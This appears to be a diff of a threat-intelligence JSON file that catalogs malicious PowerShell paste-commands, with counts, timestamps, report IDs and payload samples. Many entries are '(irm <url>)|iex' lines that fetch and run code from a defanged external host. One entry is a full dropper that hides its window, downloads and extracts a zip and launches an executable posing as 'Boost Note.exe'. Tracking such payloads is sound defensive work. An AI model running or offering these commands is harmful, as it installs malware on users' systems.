@@ -1,12 +1,11 @@
 [
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 55,
-    "ReportCount": 55,
-    "FirstSeen": "2026-11-21T01:20:41.503000+00:00",
+    "DistinctPayloadCount": 54,
+    "ReportCount": 54,
+    "FirstSeen": "2026-11-21T03:30:27.889000+00:00",
     "LastSeen": "2026-11-27T19:18:42.524000+00:00",
     "ReportIds": [
-      "cmwpq1jvq23wg0omlvvcycyd4",
       "cmwpuofwl242l0oml14schfmq",
       "cmwpzpu6g24yd0omloopfhwoj",
       "cmwpzr5sc250x0oml5ke5t7m5",
@@ -79,7 +78,6 @@
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/751686e33f3ab610')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/7abcd3ec4265c826')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/83cd888b8cd4f124')|iex",
-      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/99ef1787ae952355')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/a3d86f2e72d08c5e')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/a44602b46c6fe499')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/adfd41ca5fde8fbb')|iex",
@@ -470,11 +468,10 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 1,
-    "ReportCount": 25,
-    "FirstSeen": "2026-11-21T01:20:51.962000+00:00",
+    "ReportCount": 24,
+    "FirstSeen": "2026-11-21T04:02:40.528000+00:00",
     "LastSeen": "2026-11-22T10:45:15.619000+00:00",
     "ReportIds": [
-      "cmwpq1rz623xv0oml9b7ckyzg",
       "cmwpvtv3x24da0omlegqyi3w3",
       "cmwpwouox24kf0omlgh9z5stu",
       "cmwq11j6d25880oml93rto03l",
